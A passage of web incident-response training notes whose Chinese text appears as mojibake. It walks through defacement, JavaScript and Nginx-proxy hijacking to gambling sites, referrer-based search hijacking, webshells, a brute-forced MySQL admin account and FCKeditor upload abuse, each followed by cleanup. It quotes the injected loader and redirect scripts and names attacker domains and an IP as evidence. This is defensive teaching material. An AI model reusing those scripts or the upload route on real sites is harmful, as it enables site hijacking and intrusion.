</p>


<figure id="org7d2ec0e">
<img src="./images/img_20230817_144252.png" alt="img_20230817_144252.png" width="60%"><br>

</figure>

<p>
æ¼æ´å¤ç°ï¼šè®¿é—®æ–‡ä»¶ä¸Šä¼ æ¥å£<br>
</p>


<figure id="orgfa8a4ad">
<img src="./images/img_20230817_144309.png" alt="img_20230817_144309.png" width="60%"><br>

</figure>

<p>
æˆåŠŸä¸Šä¼ Webshell<br>
</p>


<figure id="orgea4bca8">
<img src="./images/img_20230817_144326.png" alt="img_20230817_144326.png" width="60%"><br>

</figure>

<p>
æ¼æ´ä¿®å¤ï¼šæ¸…é™¤webshellå¹¶å¯¹ä¸Šä¼ æ¥å£è¿›è¡Œä»£ç ä¿®å¤ã€‚<br>
</p>
</div>
</div>
<div id="outline-container-orge7c19cb" class="outline-3">
<h3 id="orge7c19cb">æ‰¹é‡æŒ‚é»‘é¡µ</h3>
<div class="outline-text-3" id="text-orge7c19cb">
<p>
ä½œä¸ºä¸€ä¸ªç½‘ç«™ç®¡ç†å‘˜ï¼Œä½ é‡‡ç”¨å¼€æºCMSåšç½‘ç«™ï¼Œæ¯”å¦‚dedecmsï¼Œä½†æ˜¯æœ‰ä¸€å¤©ï¼Œä½ å¿½ç„¶å‘ç°ä¸çŸ¥ä½•æ—¶ï¼Œç½‘ç«™çš„å‹æƒ…é“¾æ¥æ¨¡å—è¢«æŒ‚å¤§é‡åƒåœ¾é“¾æ¥ï¼Œç½‘ç«™å‡ºç°äº†å¾ˆå¤šä¸è¯¥æœ‰çš„ç›®å½•ï¼Œé‡Œé¢å…¨æ˜¯åšå½©ç›¸å…³çš„ç½‘é¡µã€‚è€Œä¸”ï¼Œæ”»å‡»è€…åœ¨æŒ‚é»‘é¡µä»¥åï¼Œä¼šåœ¨ä¸€äº›å°è®ºå›æ³¨å†Œé©¬ç”²å°†ä½ çš„ç½‘ç«™é»‘é¡µé“¾æ¥å‘åˆ°è®ºå›ï¼Œå¼•çˆ¬è™«æ”¶å½•ã€‚åœ¨æœç´¢å¼•æ“æœç´¢ç½‘ç«™åœ°å€æ—¶ï¼Œæ”¶å½•äº†ä¸€äº›ä¼šå‡ºç°ä¸€äº›åšå½©é¡µé¢ï¼Œä¸¥é‡å½±å“äº†ç½‘ç«™å½¢è±¡ã€‚<br>
</p>

<p>
<b>åŸå› åˆ†æï¼š</b><br>
</p>

<p>
ç½‘ç«™å­˜åœ¨é«˜å±æ¼æ´ï¼Œå¸¸è§äºä¸€äº›å­˜åœ¨å®‰å…¨æ¼æ´çš„å¼€æºCMSï¼Œåˆ©ç”¨0dayæ‰¹é‡æ‹¿ç«™ä¸Šä¼ é»‘é¡µã€‚<br>
</p>

<p>
æŸç½‘ç«™è¢«æŒ‚äº†éå¸¸å¤šåšå½©é“¾æ¥ï¼Œé“¾æ¥å½¢å¼å¦‚ä¸‹ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">http://www.xxx.com/upload/aomendduchangzaixiandobo/index.html
http://www.xxx.com/upload/aomendduchangzaixian/index.html
http://www.xxx.com/upload/aomenzhengguidubowangzhan/index.html
</pre>
</div>

<p>
é“¾æ¥å¯ä»¥è®¿é—®ï¼Œç›´æ¥è®¿é—®ç‰©ç†è·¯å¾„ä¹Ÿå¯ä»¥çœ‹åˆ°æ–‡ä»¶ï¼Œä½†æ˜¯æ‰“å¼€ç½‘ç«™ç›®å½•å¹¶æ²¡æœ‰å‘ç°è¿™äº›æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶åˆ°åº•è—åœ¨äº†å“ªï¼Ÿ<br>
</p>

<p>
è®¿é—®è¿™äº›é“¾æ¥ï¼Œè·³è½¬åˆ°å¦‚å›¾é¡µé¢ï¼š<br>
</p>


<figure id="orgbf5ddb6">
<img src="./images/img_20230817_144432.png" alt="img_20230817_144432.png" width="60%"><br>

</figure>

<p>
<b>é—®é¢˜å¤„ç†ï¼š</b><br>
1ã€æ‰“å¼€ç”µè„‘æ–‡ä»¶å¤¹é€‰é¡¹å¡ï¼Œå–æ¶ˆâ€éšè—å—ä¿æŠ¤çš„æ“ä½œç³»ç»Ÿæ–‡ä»¶â€œå‹¾é€‰ï¼ŒæŠŠâ€éšè—æ–‡ä»¶å’Œæ–‡ä»¶å¤¹â€œä¸‹é¢çš„å•é€‰é€‰æ‹©â€œæ˜¾ç¤ºéšè—çš„æ–‡ä»¶ã€æ–‡ä»¶å¤¹å’Œé©±åŠ¨å™¨â€ã€‚<br>
</p>


<figure id="orgc9681e5">
<img src="./images/img_20230817_144512.png" alt="img_20230817_144512.png" width="60%"><br>

</figure>

<p>
2ã€å†æ¬¡æŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°åŠé€æ˜çš„æ–‡ä»¶å¤¹ï¼Œæ¸…æ¥šéšè—æ–‡ä»¶å¤¹åŠæ‰€æœ‰é¡µé¢<br>
</p>


<figure id="org14a4d18">
<img src="./images/img_20230817_144532.png" alt="img_20230817_144532.png" width="60%"><br>

</figure>

<p>
3ã€ç„¶åæ¸…é™¤IISä¸´æ—¶å‹ç¼©æ–‡ä»¶<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">C:\inetpub\temp\IIS Temporary Compressed Files\WEBUI$^_gzip_D^\WEB\WEBUI\UPLOAD
</pre>
</div>


<figure id="org58e6c26">
<img src="./images/img_20230817_144557.png" alt="img_20230817_144557.png" width="60%"><br>

</figure>

<p>
4ã€åˆ é™¤ç›¸å…³çš„ç½‘é¡µæ”¶å½•ï¼Œå‡å°‘å¯¹ç½‘ç«™çš„å½±å“ã€‚<br>
</p>
</div>
</div>
<div id="outline-container-org39f73ef" class="outline-3">
<h3 id="org39f73ef">æ–°é—»æºç½‘ç«™åŠ«æŒ</h3>
<div class="outline-text-3" id="text-org39f73ef">
<p>
æ–°é—»æºç½‘ç«™ä¸€èˆ¬æƒé‡è¾ƒé«˜ï¼Œæ”¶å½•å¿«ï¼Œèƒ½å¤Ÿè¢«æœç´¢å¼•æ“ä¼˜å…ˆæ”¶å½•ï¼Œæ˜¯é»‘ç°äº§æ¨å¹¿å¼•æµçš„å¿…äº‰ä¹‹åœ°ï¼Œå¾ˆå®¹æ˜“æˆä¸ºè¢«æ”»å‡»çš„å¯¹è±¡ã€‚è¢«é»‘ä»¥åä¸»è¦æŒ‚çš„ä¸è‰¯ä¿¡æ¯å†…å®¹ä¸»è¦æ˜¯åšå½©å…­åˆå½©ç­‰èµŒåšç±»å†…å®¹ï¼Œæ–°é—»æºç½‘ç«™ç¨‹åºæ— è®ºæ˜¯è‡ªä¸»å¼€å‘çš„è¿˜æ˜¯å¼€æºç¨‹åºï¼Œéƒ½æœ‰è¢«é»‘çš„å¯èƒ½ï¼Œå¼€æºç¨‹åºæ›´å®¹æ˜“è¢«é»‘ã€‚<br>
</p>

<p>
<b>ç°è±¡æè¿°ï¼š</b><br>
æŸæ–°é—»æºç½‘ç«™é¦–é¡µå¹¿å‘Šé“¾æ¥è¢«åŠ«æŒåˆ°åšå½©ç½‘ç«™<br>
</p>


<figure id="orgef5c931">
<img src="./images/img_20230817_144639.png" alt="img_20230817_144639.png" width="60%"><br>

</figure>

<p>
æœ‰ä¸‰ä¸ªå¹¿å‘Šä¸“é¢˜ï¼Œé“¾æ¥å½¢å¼å¦‚ä¸‹ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">http://www.xxx.cn/zhuanti/yyysc/index.shtml
http://www.xxx.cn/zhuanti/wwwsc/index.shtml
http://www.xxx.cn/zhuanti/zzzsc/index.shtml
</pre>
</div>

<p>
ç‚¹å‡»è¿™ä¸‰æ¡é“¾æ¥ä¼šè·³è½¬åˆ°åšå½©ç½‘ç«™ã€‚ç®€å•æŠ“åŒ…åˆ†æä¸€ä¸‹è¿‡ç¨‹ï¼š<br>
</p>


<figure id="org69177a6">
<img src="./images/img_20230817_144724.png" alt="img_20230817_144724.png" width="60%"><br>

</figure>

<p>
å¯ä»¥å‘ç°æ­¤æ—¶è¿™ä¸ªè¿”å›é¡µé¢å·²è¢«åŠ«æŒï¼Œå¹¶ä¸”åŠ è½½äº†ç¬¬ä¸‰æ–¹jsæ–‡ä»¶ï¼Œ<a href="http://xn--dpqw2zokj.com/N/js/dt.js">http://xn--dpqw2zokj.com/N/js/dt.js</a> ï¼Œè¿›ä¸€æ­¥è®¿é—®è¯¥æ–‡ä»¶ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">var _hmt = _hmt || [];
(<span style="color: #a020f0;">function</span>() {
     var hm = document.createElement(<span style="color: #8b2252;">"script"</span>);
     hm.src = <span style="color: #8b2252;">"https://hm.baidu.com/hm.js?5fa93dff27c1ac39be066ba260b14556"</span>;
     var s = document.getElementsByTagName(<span style="color: #8b2252;">"script"</span>)[0];
     s.parentNode.insertBefore(hm, s);
 })();

<span style="color: #0000ff;">document.writeln</span>(<span style="color: #8b2252;">"&lt;script language=\"javascript\" src=\"http://xn-- dpqw2zokj.com/N/js/yz.js\"&gt;&lt;\/script&gt;"</span>);
</pre>
</div>

<p>
dt.jsè¿›ä¸€æ­¥åŠ è½½äº†å¦ä¸€æ¡jsï¼Œè®¿é—®<a href="http://xn--dpqw2zokj.com/N/js/yz.js">http://xn--dpqw2zokj.com/N/js/yz.js</a><br>
</p>
<div class="org-src-container">
<pre class="src src-sh">window.location=<span style="color: #8b2252;">"https://lemcoo.com/?dt"</span>;
</pre>
</div>

<p>
æˆ‘ä»¬å‘ç°é“¾æ¥è·³è½¬åˆ°<a href="https://lemcoo.com/?dt">https://lemcoo.com/?dt</a> ï¼Œè¿›ä¸€æ­¥è®¿é—®è¿™ä¸ªé“¾æ¥ï¼Œç½‘ç«™ä¸ºåšå½©é“¾æ¥å¯¼èˆªç½‘ç«™ï¼Œè®¿é—®åä¼šéšæœºè·³è½¬åˆ°ç¬¬ä¸‰æ–¹èµŒåšç½‘ç«™ã€‚<br>
</p>

<p>
<b>é—®é¢˜å¤„ç†ï¼š</b><br>
æ‰¾åˆ°urlå¯¹åº”çš„æ–‡ä»¶ä½ç½®ï¼Œåˆ é™¤ã€‚<br>
</p>

<p>
æ‰¾åˆ°urlå¯¹åº”çš„æ–‡ä»¶ä½ç½®ï¼Œå³ä½¿æ–‡ä»¶è¢«åˆ é™¤ï¼Œé“¾æ¥ä¾ç„¶å¯ä»¥è®¿é—®ï¼Œå¯ä»¥å‘ç°ä¸‰æ¡é“¾æ¥éƒ½æ˜¯ä»¥â€œscâ€åç¼€ã€‚<br>
</p>

<p>
å¯¹Nginxé…ç½®æ–‡ä»¶è¿›è¡Œæ’æŸ¥ï¼Œå‘ç°Nginxé…ç½®æ–‡ä»¶VirtualHost.confè¢«ç¯¡æ”¹ï¼Œé€šè¿‡åå‘ä»£ç†åŒ¹é…ä»¥â€œscâ€åç¼€çš„ä¸“é¢˜é“¾æ¥ï¼ŒåŠ«æŒåˆ°<a href="http://103.233.248.163">http://103.233.248.163</a> ï¼Œè¯¥ç½‘ç«™ä¸ºåšå½©é“¾æ¥å¯¼èˆªç½‘ç«™ã€‚<br>
</p>


<figure id="org95fbaa0">
<img src="./images/img_20230817_145007.png" alt="img_20230817_145007.png" width="60%"><br>

</figure>

<p>
åˆ é™¤æ¶æ„ä»£ç†åï¼Œä¸“é¢˜é“¾æ¥è®¿é—®æ¢å¤ã€‚<br>
</p>
</div>
</div>
<div id="outline-container-org5e38e65" class="outline-3">
<h3 id="org5e38e65">æœç´¢å¼•æ“åŠ«æŒ</h3>
<div class="outline-text-3" id="text-org5e38e65">
<p>
å½“ä½ ç›´æ¥æ‰“å¼€ç½‘å€è®¿é—®ç½‘ç«™ï¼Œæ˜¯æ­£å¸¸çš„ï¼Œå¯æ˜¯å½“ä½ åœ¨æœç´¢å¼•æ“ç»“æœé¡µä¸­æ‰“å¼€ç½‘ç«™æ—¶ï¼Œä¼šè·³è½¬åˆ°ä¸€äº›å…¶ä»–ç½‘ç«™ï¼Œæ¯”å¦‚åšå½©ï¼Œè™šå‡å¹¿å‘Šï¼Œæ·˜å®æœç´¢é¡µé¢ç­‰ã€‚æ˜¯çš„ï¼Œä½ å¯èƒ½äº†é‡åˆ°æœç´¢å¼•æ“åŠ«æŒã€‚<br>
</p>

<p>
ä»æœç´¢å¼•æ“æ¥çš„æµé‡è‡ªåŠ¨è·³è½¬åˆ°æŒ‡å®šçš„ç½‘é¡µ<br>
</p>

<p>
é€šè¿‡å¯¹index.phpæ–‡ä»¶è¿›è¡Œä»£ç åˆ†æï¼Œå‘ç°è¯¥æ–‡ä»¶ä»£ç  å¯¹æ¥è‡ªæœç‹—å’Œå¥½æœçš„è®¿é—®è¿›è¡Œæµé‡åŠ«æŒã€‚<br>
</p>


<figure id="org7219345">
<img src="./images/img_20230817_145033.png" alt="img_20230817_145033.png" width="60%"><br>

</figure>

<p>
è¿›ä¸€æ­¥è·Ÿè¸ªincludeå‡½æ•°åŒ…å«çš„æ–‡ä»¶ï¼Œindex.phpåŒ…å«/tmp/.ICE-unix/.. /c.jpgã€‚<br>
</p>


<figure id="org46cd597">
<img src="./images/img_20230817_145048.png" alt="img_20230817_145048.png" width="60%"><br>

</figure>

<p>
è¿›å…¥/tmpç›®å½•è¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°è¯¥ç›®å½•ä¸‹ï¼Œå¦‚c.jpgç­‰æ–‡ä»¶ï¼ŒåŒ…å«ç€ä¸€å¥—åšå½©åŠ«æŒçš„ç¨‹åºã€‚<br>
</p>


<figure id="org08bed6a">
<img src="./images/img_20230817_145107.png" alt="img_20230817_145107.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-orga8d7185" class="outline-3">
<h3 id="orga8d7185">ç½‘ç«™é¦–é¡µè¢«ç¯¡æ”¹</h3>
<div class="outline-text-3" id="text-orga8d7185">
<p>
ç½‘ç«™é¦–é¡µè¢«éæ³•ç¯¡æ”¹ï¼Œå½“ä½ ä¸€æ‰“å¼€ç½‘ç«™å°±çŸ¥é“è‡ªå·±çš„ç½‘ç«™å‡ºç°äº†å®‰å…¨é—®é¢˜ï¼Œç½‘ç«™ç¨‹åºå­˜åœ¨ä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡ä¸Šä¼ è„šæœ¬æœ¨é©¬ï¼Œä»è€Œå¯¹ç½‘ç«™å†…å®¹è¿›è¡Œç¯¡æ”¹ã€‚è€Œè¿™ç§ç¯¡æ”¹äº‹ä»¶åœ¨æŸäº›åœºæ™¯ä¸‹çš„å½±å“ï¼Œä¼šè¢«æ— é™æ”¾å¤§ã€‚<br>
</p>

<p>
ç°è±¡æè¿°ï¼šç½‘ç«™é¦–é¡µè¢«æ¶æ„ç¯¡æ”¹ï¼Œæ¯”å¦‚å¤åˆ¶åŸæ¥çš„å›¾ç‰‡ï¼ŒPSä¸€ä¸‹ï¼Œç„¶åæ›¿æ¢ä¸Šå»ã€‚<br>
</p>

<p>
é—®é¢˜å¤„ç†ï¼š<br>
ç¡®è®¤ç¯¡æ”¹æ—¶é—´ï¼šé€šè¿‡å¯¹è¢«ç¯¡æ”¹çš„å›¾ç‰‡è¿›è¡ŒæŸ¥çœ‹ï¼Œç¡®è®¤å›¾ç‰‡ç¯¡æ”¹æ—¶é—´ä¸º2018å¹´04æœˆ18æ—¥ 19:24:07 ã€‚<br>
</p>

<p>
è®¿é—®æ—¥å¿—æº¯æºï¼šé€šè¿‡å›¾ç‰‡ä¿®æ”¹çš„æ—¶é—´èŠ‚ç‚¹ï¼Œå‘ç°å¯ç–‘IPï¼š113.xx.xx.24 ï¼ˆä»£ç†IPï¼Œæ— æ³•è¿½æº¯çœŸå®æ¥æºï¼‰ï¼Œè®¿é—®image.jspï¼ˆè„šæœ¬æœ¨é©¬ï¼‰ï¼Œå¹¶éšåè®¿é—®äº†è¢«ç¯¡æ”¹çš„å›¾ç‰‡åœ°å€ã€‚<br>
</p>


<figure id="org3ce39df">
<img src="./images/img_20230817_145153.png" alt="img_20230817_145153.png" width="60%"><br>

</figure>

<p>
è¿›ä¸€æ­¥å®¡æŸ¥æ‰€æœ‰çš„æ—¥å¿—æ–‡ä»¶(æ—¥å¿—ä¿å­˜æ—¶é—´ä»2017-04-20è‡³2018-04-19)ï¼Œå‘ç°ä¸€å…±åªæœ‰ä¸¤æ¬¡è®¿é—®image.jspæ–‡ä»¶çš„è®°å½•ï¼Œåˆ†åˆ«æ˜¯2018-04-18å’Œ2017-09-21ã€‚<br>
</p>


<figure id="org807b1a1">
<img src="./images/img_20230817_145211.png" alt="img_20230817_145211.png" width="60%"><br>

</figure>

<p>
image.jspåœ¨2017-09-21ä¹‹å‰å°±å·²ç»ä¸Šä¼ åˆ°ç½‘ç«™æœåŠ¡å™¨ï¼Œå·²ç»æ½œè—é•¿è¾¾åŠå¹´å¤šç”šè‡³æ›´ä¹…çš„æ—¶é—´ã€‚<br>
</p>

<p>
<b>äº‹ä»¶åˆ†æï¼š</b><br>
</p>

<p>
å‘ç°ç«™ç‚¹ç›®å½•ä¸‹å­˜åœ¨ROOT.rarå…¨ç«™æºç å¤‡ä»½æ–‡ä»¶ï¼Œå¤‡ä»½æ—¶é—´ä¸º2017-02-28 10:35<br>
</p>


<figure id="org5f37697">
<img src="./images/img_20230817_145252.png" alt="img_20230817_145252.png" width="60%"><br>

</figure>

<p>
é€šè¿‡å¯¹ROOT.rarè§£å‹ç¼©ï¼Œå‘ç°æºç ä¸­å­˜åœ¨çš„è„šæœ¬æœ¨é©¬ä¸ç½‘ç«™è®¿é—®æ—¥å¿—çš„å¯ç–‘æ–‡ä»¶åä¸€è‡´ï¼ˆimage.jspï¼‰<br>
</p>


<figure id="orgc0ef72e">
<img src="./images/img_20230817_145306.png" alt="img_20230817_145306.png" width="60%"><br>

</figure>

<p>
æ ¹æ®è¿™å‡ ä¸ªæ—¶é—´èŠ‚ç‚¹ï¼Œæˆ‘ä»¬å°è¯•å»è¿˜åŸæ”»å‡»è€…çš„æ”»å‡»è·¯å¾„ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨è®¿é—®æ—¥å¿—å¹¶æœªæ‰¾åˆ°ROOT.rarçš„è®¿é—®ä¸‹è½½è®°å½•ï¼Œè®¿é—®æ—¥å¿—åªä¿ç•™äº†è¿‘ä¸€å¹´çš„è®°å½•ï¼Œè€Œè¿™ä¸ªWebshellå¯èƒ½å·²ç»å­˜åœ¨äº†å¤šå¹´ã€‚<br>
</p>

<p>
é»‘å®¢æ˜¯å¦‚ä½•è·å–Webshellçš„å‘¢ï¼Ÿ<br>
</p>

<p>
å¯èƒ½æ˜¯é€šè¿‡ä¸‹è½½ROOT.rarå…¨ç«™æºç å¤‡ä»½æ–‡ä»¶è·å–åˆ°å…¶ä¸­å­˜åœ¨çš„æœ¨é©¬ä¿¡æ¯ï¼Œæˆ–è€…å‡ å¹´å‰å…¥ä¾µå¹¶æ½œè—äº†å¤šå¹´ï¼Œåˆæˆ–è€…æ˜¯ä»åœ°ä¸‹é»‘äº§è´­ä¹°äº†shellï¼Œæˆ‘ä»¬ä¸å¾—è€ŒçŸ¥ã€‚è¯¥ç¤ºä¾‹ä¸­æ”»å‡»è€…ä¸ºæˆ‘ä»¬ç•™ä¸‹äº†å¤§é‡çš„è¯æ®å’Œè®°å½•ï¼Œè€Œæ›´å¤šæ—¶å€™ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ¸…é™¤æ‰€æœ‰çš„å…³é”®ä¿¡æ¯ï¼Œè¿™åŠ¿å¿…ä¼šåŠ å¤§è°ƒæŸ¥äººå‘˜çš„å–è¯éš¾åº¦ã€‚<br>
</p>
</div>
</div>
<div id="outline-container-org155134d" class="outline-3">
<h3 id="org155134d">ç®¡ç†å‘˜è´¦å·è¢«ç¯¡æ”¹</h3>
<div class="outline-text-3" id="text-org155134d">
<p>
ä½¿ç”¨ç¯å¢ƒï¼šWindows Server 2008 + phpstudy + DVWA<br>
</p>

<p>
åœºæ™¯ï¼šç®¡ç†å‘˜è´¦å·adminæ— æ³•ç™»å½•ï¼Œè¿›å…¥æ•°æ®åº“æŸ¥çœ‹ï¼ŒåŸæ¥ç®¡ç†å‘˜è´¦å·ç”¨æˆ·åä¸å­˜åœ¨äº†ï¼Œå´å¤šäº†å¦å¤–ä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·åï¼Œç®¡ç†å‘˜è´¦å·è¢«ç¯¡æ”¹äº†ã€‚<br>
</p>

<p>
ç®¡ç†å‘˜å¯†ç åŸæœ¬ä¸ºadmin/password<br>
</p>

<p>
æŸå¤©ç®¡ç†å‘˜å‘ç°è¯¥è´¦å·å·²ç»æ— æ³•ç™»å½•<br>
</p>


<figure id="org5f45a23">
<img src="./images/img_20230817_145349.png" alt="img_20230817_145349.png" width="60%"><br>

</figure>

<p>
<b>æ—¥å¿—åˆ†æï¼š</b><br>
</p>

<p>
æŸ¥çœ‹æ•°æ®åº“è®¿é—®æ—¥å¿—ï¼Œå‘ç°æ”»å‡»è€…ipå­˜åœ¨æš´åŠ›ç ´è§£è¡Œä¸º<br>
cat /var/lib/mysql/a21ec98a8b54.log<br>
</p>


<figure id="org2db7a47">
<img src="./images/img_20230817_145411.png" alt="img_20230817_145411.png" width="60%"><br>

</figure>

<p>
å‘ç°åœ¨2022å¹´4æœˆ28æ—¥ï¼Œæ”»å‡»è€…æˆåŠŸè¿æ¥åˆ°mysql<br>
</p>


<figure id="orgbf72053">
<img src="./images/img_20230817_145424.png" alt="img_20230817_145424.png" width="60%"><br>

</figure>

<p>
ç™»å½•æ•°æ®åº“æŸ¥è¯¢å‘ç°åœ¨å¯¹åº”æ—¶é—´æ®µå¯†ç è¢«ä¿®æ”¹ä¸ºhackerã€‚<br>
</p>


<figure id="orgcbed7a8">
<img src="./images/img_20230817_145441.png" alt="img_20230817_145441.png" width="60%"><br>

</figure>

<p>
<b>åº”æ€¥æªæ–½</b><br>
1ã€å°ç¦IPåœ°å€<br>
2ã€ä¿®æ”¹ç®¡ç†å‘˜è¡¨å¯†ç å­—æ®µä¸ºå¼ºå£ä»¤<br>
3ã€ä¿®æ”¹mysqlå¯†ç ä¸ºå¼ºå£ä»¤<br>
4ã€é™åˆ¶mysqlå¤–è¿<br>
</p>
</div>
</div>
<div id="outline-container-org3a2c983" class="outline-3">
<h3 id="org3a2c983">ç¼–è¾‘å™¨å…¥ä¾µäº‹ä»¶</h3>
<div class="outline-text-3" id="text-org3a2c983">
<p>
ä½¿ç”¨ç¯å¢ƒï¼šWindows Servers 2008 + IIS + FCKeditor<br>
</p>

<p>
ç°è±¡æè¿°ï¼šé˜²æŠ¤è®¾å¤‡å‘å‡ºé¢„è­¦ï¼šå‘ç°åé—¨(Webshell)æ–‡ä»¶ï¼Œå»ºè®®ç«‹å³è¿›è¡Œå¤„ç†ã€‚<br>
</p>


<figure id="org05b3769">
<img src="./images/img_20230817_145532.png" alt="img_20230817_145532.png" width="60%"><br>

</figure>

<p>
å¤‡æ³¨ï¼šç´§æ€¥å¤„ç†ï¼Œé€šè¿‡ç¦æ­¢åŠ¨æ€è„šæœ¬åœ¨ä¸Šä¼ ç›®å½•çš„è¿è¡Œæƒé™ï¼Œä½¿Webshellæ— æ³•æˆåŠŸæ‰§è¡Œã€‚<br>
</p>

<p>
å®šä½ä¸Šä¼ æ—¶é—´ï¼šæ ¹æ®Webshellæ–‡ä»¶åˆ›å»ºæ—¶é—´ï¼Œ2022å¹´4æœˆ28æ—¥ 15:18:07<br>
</p>


<figure id="org08f219d">
<img src="./images/img_20230817_145550.png" alt="img_20230817_145550.png" width="60%"><br>

</figure>

<p>
<b>Webè®¿é—®æ—¥å¿—åˆ†æ</b><br>
</p>

<p>
ç”±äºï¼ŒIISæ—¥å¿—æ—¶é—´ä¸ç³»ç»Ÿæ—¶é—´ç›¸å·®8å°æ—¶ï¼Œç³»ç»Ÿæ—¶é—´æ˜¯15:08ï¼Œæˆ‘ä»¬è¿™é‡ŒæŸ¥çœ‹çš„æ˜¯ 6:59çš„æ—¥å¿—æ—¶é—´ã€‚<br>
</p>

<p>
C:\inetpub\logs\LogFiles\W3SVC2\u_ex220428.log<br>
</p>


<figure id="org989c695">
<img src="./images/img_20230817_145620.png" alt="img_20230817_145620.png" width="60%"><br>

</figure>

<p>
æ‰¾åˆ°å¯¹åº”çš„ç½‘ç«™è®¿é—®æ—¥å¿—ï¼Œåœ¨è¿™æ®µæ—¶é—´é‡Œæˆ‘ä»¬å‘ç°æ”»å‡»è€…è®¿é—®äº†fckçš„æ–‡ä»¶ä¸Šä¼ åœ°å€<br>
<a href="http://192.168.85.150:81/FCKeditor/editor/filemanager/browser/default/connectors/test.html">http://192.168.85.150:81/FCKeditor/editor/filemanager/browser/default/connectors/test.html</a><br>
</p>


<figure id="org60a5f4a">
<img src="./images/img_20230817_145640.png" alt="img_20230817_145640.png" width="60%"><br>

</figure>

<p>
<a href="http://192.168.85.150:81/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp">http://192.168.85.150:81/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp</a><br>
</p>


<figure id="org12e6abb">
<img src="./images/img_20230817_145656.png" alt="img_20230817_145656.png" width="60%"><br>

</figure>

<p>
<b>æ¼æ´å¤ç°</b><br>
</p>

<p>
æ­¤å¤„ä¸Šä¼ aspæœ¨é©¬ä¸æˆåŠŸ<br>
</p>


<figure id="orgc750b77">
<img src="./images/img_20230817_145754.png" alt="img_20230817_145754.png" width="60%"><br>

</figure>

<p>
åœ¨test.htmlæ¥å£æˆåŠŸä¸Šä¼ Webshell<br>
<a href="http://192.168.85.150:81/FCKeditor/editor/filemanager/browser/default/connectors/test.html">http://192.168.85.150:81/FCKeditor/editor/filemanager/browser/default/connectors/test.html</a><br>
</p>


<figure id="orgbdbf1ab">
<img src="./images/img_20230817_145821.png" alt="img_20230817_145821.png" width="60%"><br>

</figure>

<p>
<b>è¿˜åŸæ”»å‡»è€…è¡Œä¸ºï¼š</b> é€šè¿‡ç›¸å…³æ–‡ä»¶çš„è®¿é—®è®°å½•è¿›è¡Œå…³è”åˆ†æï¼Œæ”»å‡»è€…é€šè¿‡ fckeditorç¼–è¾‘å™¨çš„æµ‹è¯•é¡µé¢æˆåŠŸä¸Šä¼ Webshellã€‚<br>
</p>

<p>
<b>äº‹ä»¶å¤„ç†ï¼š</b><br>
1ã€åˆ é™¤Webshellï¼šæ¸…é™¤å·²å‘ç°çš„webshellï¼Œå¹¶å°è¯•æŸ¥æ‰¾å¯èƒ½éšè—çš„webshellã€‚<br>
2ã€ä»£ç å®Œæ•´æ€§éªŒè¯ï¼šæˆ‘ä»¬æ¥æ€è€ƒä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœæœ‰ä¸€ä¸ªå…æ€çš„Webshelléšè—åœ¨æ•°ä»¥ä¸‡è¡Œçš„ä»£ç ä¸­ï¼Œå¦‚<br>
ä½•è¿›è¡Œåº”æ€¥ï¼Ÿ&#x2013; æ–‡ä»¶å®Œæ•´æ€§æ ¡éªŒï¼Œæ£€æŸ¥ç½‘ç«™çš„æºç æ˜¯å¦è¢«ç¯¡æ”¹è¿‡ã€‚<br>
æ“ä½œè¿‡ç¨‹ï¼šé€šè¿‡æŸ¥çœ‹æœåŠ¡å™¨ä¸Šå·²éƒ¨ç½²çš„æºä»£ç ç‰ˆæœ¬ï¼Œæ‰¾ç ”å‘åŒäº‹è¦åŒæ ·ç‰ˆæœ¬çš„ä»£ç ã€‚æŠŠçº¯å‡€æºç çš„æ‰€æœ‰æ–‡ä»¶è®¡ç®—ä¸€æ¬¡hashå€¼ä¿å­˜ï¼Œå†åˆ°æœåŠ¡å™¨ä¸Šæ‰§è¡Œä¸€æ¬¡hashå€¼ï¼Œé€šè¿‡æ¯”å¯¹hashå€¼ï¼Œè¾“å‡ºæ–°åˆ›å»ºçš„/è¢«ä¿®æ”¹è¿‡çš„/åˆ é™¤çš„æ–‡ä»¶åˆ—è¡¨ã€‚<br>
</p>

<p>
3ã€ç³»ç»Ÿå…¥ä¾µæ’æŸ¥ï¼šå¯¹ç³»ç»Ÿåšä¸€ä¸ªæ•´ä½“æ’æŸ¥ï¼Œç¡®è®¤æ˜¯å¦å­˜åœ¨åé—¨<br>
4ã€ä»£ç ä¿®å¤ï¼šåé¦ˆç»™ç›¸å…³å¼€å‘äººå‘˜è¿›è¡Œä»£ç ä¿®å¤ã€‚<br>
</p>
</div>
</div>
</section>
<section id="outline-container-org8fa7a40" class="outline-2">
<h2 id="org8fa7a40">æ’°å†™åº”æ€¥å“åº”æŠ¥å‘Š</h2>
<div class="outline-text-2" id="text-org8fa7a40">
<p>
å‰é¢æˆ‘ä»¬å­¦ä¹ äº†åº”æ€¥å“åº”æŠ€æœ¯å’Œå®æˆ˜æ¡ˆä¾‹ï¼Œè¿ç”¨åˆ°å®é™…å·¥ä½œä¸­æ—¶ï¼Œéœ€è¦æŒ‰ç…§æµç¨‹æ‰§è¡Œã€‚åº”æ€¥å“åº”å¸¸è§çš„6<br>
ä¸ªé˜¶æ®µï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#20934;&#22791;&#38454;&#27573; Preparation
2&#12289;&#26816;&#27979;&#38454;&#27573; Detection
3&#12289;&#25233;&#21046;&#38454;&#27573; Control
4&#12289;&#26681;&#38500;&#38454;&#27573; Eradicate
5&#12289;&#24674;&#22797;&#38454;&#27573; Recovery
6&#12289;&#24635;&#32467;&#38454;&#27573; Follow
</pre>
</div>


<figure id="org065d270">
<img src="./images/img_20230817_150014.png" alt="img_20230817_150014.png" width="60%"><br>

</figure>

<p>
